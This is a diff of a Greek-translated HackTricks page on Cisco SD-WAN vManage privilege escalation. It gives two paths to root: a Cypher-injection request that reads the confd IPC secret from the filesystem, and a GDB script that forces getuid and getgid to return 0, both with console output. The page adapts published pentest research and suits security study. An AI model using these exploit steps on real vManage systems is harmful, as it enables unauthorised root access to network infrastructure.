@@ -1,28 +1,31 @@
 # Cisco - vmanage
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Εγγραφείτε** [**💬**](https://emojipedia.org/speech-balloon/) [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Διαδρομή 1
+## Path 1
 
-(Παράδειγμα από [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
+(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-Αφού ψάξαμε λίγο μέσα από κάποια [τεκμηρίωση](http://66.218.245.39/doc/html/rn03re18.html) που σχετίζεται με το `confd` και τα διάφορα δυαδικά αρχεία (προσβάσιμα με έναν λογαριασμό στην ιστοσελίδα της Cisco), ανακαλύψαμε ότι για να πιστοποιήσει το IPC socket, χρησιμοποιεί ένα μυστικό που βρίσκεται στο `/etc/confd/confd_ipc_secret`:
+Μετά από λίγο ψάξιμο σε κάποια [documentation](http://66.218.245.39/doc/html/rn03re18.html) που σχετίζεται με το `confd` και τα διάφορα binaries (προσβάσιμα με έναν λογαριασμό στην ιστοσελίδα της Cisco), βρήκαμε ότι για να πιστοποιήσει το IPC socket, χρησιμοποιεί ένα μυστικό που βρίσκεται στο `/etc/confd/confd_ipc_secret`:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Θυμάστε την περίπτωση της Neo4j; Εκτελείται με τα δικαιώματα του χρήστη `vmanage`, επιτρέποντάς μας να ανακτήσουμε το αρχείο χρησιμοποιώντας την προηγούμενη ευπάθεια:
+Θυμάστε την εγκατάσταση Neo4j μας; Εκτελείται υπό τα δικαιώματα του χρήστη `vmanage`, επιτρέποντάς μας να ανακτήσουμε το αρχείο χρησιμοποιώντας την προηγούμενη ευπάθεια:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -34,7 +37,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-Το πρόγραμμα `confd_cli` δεν υποστηρίζει παραμέτρους γραμμής εντολών, αλλά καλεί το `/usr/bin/confd_cli_user` με ορίσματα. Έτσι, μπορούμε να καλέσουμε απευθείας το `/usr/bin/confd_cli_user` με το δικό μας σύνολο ορισμάτων. Ωστόσο, δεν είναι αναγνώσιμο με τα τρέχοντα προνόμια μας, οπότε πρέπει να το ανακτήσουμε από το rootfs και να το αντιγράψουμε χρησιμοποιώντας το scp, να διαβάσουμε τη βοήθεια και να το χρησιμοποιήσουμε για να πάρουμε το κέλυφος:
+Το πρόγραμμα `confd_cli` δεν υποστηρίζει παραμέτρους γραμμής εντολών αλλά καλεί το `/usr/bin/confd_cli_user` με παραμέτρους. Έτσι, θα μπορούσαμε να καλέσουμε απευθείας το `/usr/bin/confd_cli_user` με το δικό μας σύνολο παραμέτρων. Ωστόσο, δεν είναι αναγνώσιμο με τα τρέχοντα δικαιώματά μας, οπότε πρέπει να το ανακτήσουμε από το rootfs και να το αντιγράψουμε χρησιμοποιώντας scp, να διαβάσουμε τη βοήθεια και να το χρησιμοποιήσουμε για να αποκτήσουμε το shell:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -52,11 +55,11 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## Διαδρομή 2
+## Path 2
 
-(Παράδειγμα από [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
+(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-Το blog¹ της ομάδας synacktiv περιγράφει έναν κομψό τρόπο για να αποκτήσετε ένα root shell, αλλά το πρόβλημα είναι ότι απαιτείται να αποκτήσετε ένα αντίγραφο του `/usr/bin/confd_cli_user` το οποίο είναι μόνο αναγνώσιμο από τον root. Βρήκα έναν άλλο τρόπο για να αναβαθμίσετε σε root χωρίς τέτοια ενόχληση.
+Το blog¹ της ομάδας synacktiv περιέγραψε έναν κομψό τρόπο για να αποκτήσετε ένα root shell, αλλά η προειδοποίηση είναι ότι απαιτεί να αποκτήσετε ένα αντίγραφο του `/usr/bin/confd_cli_user` το οποίο είναι αναγνώσιμο μόνο από τον root. Βρήκα έναν άλλο τρόπο για να αναβαθμίσω σε root χωρίς τέτοια ταλαιπωρία.
 
 Όταν αποσυναρμολόγησα το δυαδικό αρχείο `/usr/bin/confd_cli`, παρατήρησα τα εξής:
 ```
@@ -87,20 +90,20 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-Όταν εκτελώ την εντολή "ps aux", παρατήρησα τα παρακάτω (_σημείωση -g 100 -u 107_)
+Όταν εκτελώ “ps aux”, παρατήρησα τα εξής (_note -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Υπέθεσα ότι το πρόγραμμα "confd\_cli" περνάει το αναγνωριστικό χρήστη και την αναγνωριστική ομάδα που συλλέγει από τον συνδεδεμένο χρήστη στην εφαρμογή "cmdptywrapper".
+Υπέθεσα ότι το πρόγραμμα “confd\_cli” περνά το αναγνωριστικό χρήστη και το αναγνωριστικό ομάδας που συνέλεξε από τον συνδεδεμένο χρήστη στην εφαρμογή “cmdptywrapper”.
 
-Η πρώτη μου προσπάθεια ήταν να εκτελέσω απευθείας το "cmdptywrapper" και να του παρέχω τις παραμέτρους `-g 0 -u 0`, αλλά απέτυχε. Φαίνεται ότι δημιουργήθηκε ένας περιγραφέας αρχείου (-i 1015) κάπου κατά τη διάρκεια της διαδικασίας και δεν μπορώ να τον πλαστογραφήσω.
+Η πρώτη μου προσπάθεια ήταν να εκτελέσω το “cmdptywrapper” απευθείας και να του παρέχω `-g 0 -u 0`, αλλά απέτυχε. Φαίνεται ότι δημιουργήθηκε ένας περιγραφέας αρχείου (-i 1015) κάπου στη διαδικασία και δεν μπορώ να τον προσποιηθώ.
 
-Όπως αναφέρεται στο ιστολόγιο της synacktiv (τελευταίο παράδειγμα), το πρόγραμμα `confd_cli` δεν υποστηρίζει παραμέτρους γραμμής εντολών, αλλά μπορώ να το επηρεάσω με έναν αποσφαλματωτή και ευτυχώς το GDB περιλαμβάνεται στο σύστημα.
+Όπως αναφέρθηκε στο blog της synacktiv (τελευταίο παράδειγμα), το πρόγραμμα `confd_cli` δεν υποστηρίζει παραμέτρους γραμμής εντολών, αλλά μπορώ να το επηρεάσω με έναν αποσφαλματωτή και ευτυχώς το GDB περιλαμβάνεται στο σύστημα.
 
-Δημιούργησα ένα σενάριο GDB όπου ανάγκασα τις API `getuid` και `getgid` να επιστρέψουν 0. Εφόσον ήδη έχω τα δικαιώματα "vmanage" μέσω της ευπάθειας RCE της αποσειροποίησης, έχω άδεια να διαβάσω απευθείας το αρχείο `/etc/confd/confd_ipc_secret`.
+Δημιούργησα ένα σενάριο GDB όπου ανάγκαζα την API `getuid` και `getgid` να επιστρέφουν 0. Δεδομένου ότι ήδη έχω δικαιώματα “vmanage” μέσω της αποσυμπίεσης RCE, έχω άδεια να διαβάσω το `/etc/confd/confd_ipc_secret` απευθείας.
 
 root.gdb:
 ```
@@ -120,7 +123,7 @@ root
 end
 run
 ```
-Έξοδος κονσόλας:
+Κονσόλα Έξοδος:
 ```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -154,14 +157,17 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Υποστήριξη HackTricks</summary>
 
-* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε τη **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στη **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
